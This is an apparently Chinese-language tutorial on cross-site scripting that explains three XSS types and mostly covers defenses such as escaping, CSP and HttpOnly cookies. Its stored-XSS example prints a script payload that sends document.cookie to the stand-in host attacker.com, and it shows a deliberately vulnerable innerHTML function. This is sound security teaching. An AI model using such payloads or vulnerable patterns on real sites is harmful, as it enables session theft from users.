# XSS跨站脚本攻击 (Cross-Site Scripting)

## 什么是XSS？

跨站脚本攻击（Cross-Site Scripting，简称XSS）是一种常见的Web安全漏洞，攻击者通过在Web页面中注入恶意脚本，当其他用户浏览该页面时，脚本会在用户浏览器中执行。这可能导致会话劫持、数据盗窃、网站篡改等严重后果。

## XSS的工作原理

XSS攻击发生在Web应用程序没有正确验证或转义用户输入的情况下。攻击者将恶意JavaScript代码注入到页面中，当其他用户访问包含这些代码的页面时，浏览器会执行这些代码，就像它们是页面的合法组成部分一样。

## XSS的三种主要类型

### 1. 存储型XSS (Stored XSS)

**特点**：恶意脚本被永久存储在目标服务器上（如数据库、留言板、评论区等）。

**攻击流程**：
1. 攻击者将恶意脚本提交到目标网站的数据库中
2. 其他用户浏览包含恶意脚本的页面
3. 恶意脚本在用户浏览器中执行

**影响范围**：影响所有访问该页面的用户，危害较大。

**典型场景**：论坛评论、用户资料、博客文章等用户可提交内容的地方。

### 2. 反射型XSS (Reflected XSS)

**特点**：恶意脚本包含在URL中，当用户点击特制的URL时，脚本被反射到用户浏览器中执行。

**攻击流程**：
1. 攻击者构造包含恶意脚本的URL
2. 诱导用户点击该URL
3. 当用户访问URL时，恶意脚本被反射到浏览器并执行

**影响范围**：通常只影响点击链接的特定用户。

**典型场景**：搜索页面、错误页面、URL参数直接显示在页面的地方。

### 3. DOM型XSS (DOM-based XSS)

**特点**：漏洞存在于客户端代码中，恶意脚本不会经过服务器，而是通过修改页面的DOM结构来执行。

**攻击流程**：
1. 攻击者构造特制URL或诱导用户执行特定操作
2. 客户端JavaScript代码处理URL或用户操作时产生漏洞
3. 恶意脚本在客户端执行

**影响范围**：取决于漏洞的性质和攻击方式。

**典型场景**：使用`document.write()`、`eval()`、`innerHTML`等操作DOM的地方。

## XSS攻击示例

### 存储型XSS示例

攻击者在评论区提交以下内容：

```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

当其他用户查看此评论时，恶意脚本会执行并将用户的cookie发送到攻击者的服务器。

### 反射型XSS示例

攻击者构造如下URL：

```
http://example.com/search.php?q=<script>alert('XSS')</script>
```

如果网站直接将搜索参数显示在页面上而不进行转义，当用户点击此链接时，会弹出alert对话框。

### DOM型XSS示例

假设有如下JavaScript代码：

```javascript
function displaySearchQuery() {
    var search = document.location.search;
    var query = search.substring(search.indexOf('q=') + 2);
    document.getElementById('search-results').innerHTML = '搜索结果: ' + query;
}
```

攻击者可以构造URL：

```
http://example.com/search.html?q=<img src=x onerror=alert('DOM XSS')>
```

## XSS的防御措施

### 1. 输入验证和过滤

对所有用户输入进行严格的验证和过滤，确保输入符合预期的格式。

```python
# Python中使用html模块转义
import html

def sanitize_input(user_input):
    return html.escape(user_input)

# 使用
user_input = request.args.get('input', '')
safe_input = sanitize_input(user_input)
```

### 2. 输出编码

在将用户提供的数据输出到页面之前，进行适当的HTML编码，确保特殊字符不会被解释为HTML或JavaScript代码。

**JavaScript中使用**：

```javascript
// 使用textContent而不是innerHTML
document.getElementById('output').textContent = userInput;

// 或者手动转义
function escapeHtml(text) {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

### 3. Content Security Policy (CSP)

实现内容安全策略，限制浏览器可以执行的脚本来源，有效防止XSS攻击。

在HTTP头中设置：

```
Content-Security-Policy: default-src 'self'; script-src 'self' trusted-cdn.com
```

或者在HTML中设置：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' trusted-cdn.com">
```

### 4. 使用HttpOnly Cookie

将Cookie设置为HttpOnly，可以防止JavaScript访问Cookie，减轻XSS攻击的危害。

```
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

### 5. 实施X-XSS-Protection头

启用浏览器内置的XSS过滤功能。

```
X-XSS-Protection: 1; mode=block
```

### 6. 使用安全的JavaScript API

避免使用危险的JavaScript函数，如：
- `eval()`
- `document.write()`
- `innerHTML`（不经过验证的情况下）
- `setTimeout()`和`setInterval()`（使用字符串参数时）

### 7. 实施输入长度限制

限制用户输入的长度，减少攻击面。

## 安全编码最佳实践

1. **永不信任用户输入**：对所有用户输入进行验证和清理
2. **输出编码**：在显示用户数据前进行适当的编码
3. **使用现代框架**：现代Web框架（如React、Angular、Vue）内置了XSS防护机制
4. **定期进行安全测试**：使用工具如OWASP ZAP进行XSS测试
5. **保持软件更新**：及时更新Web服务器、框架和库

## 总结

XSS是一种常见但严重的Web安全漏洞，通过采用适当的防御措施，如输入验证、输出编码、内容安全策略等，可以有效地减少XSS攻击的风险。在开发过程中，遵循安全编码规范，定期进行安全测试是确保应用程序安全的关键。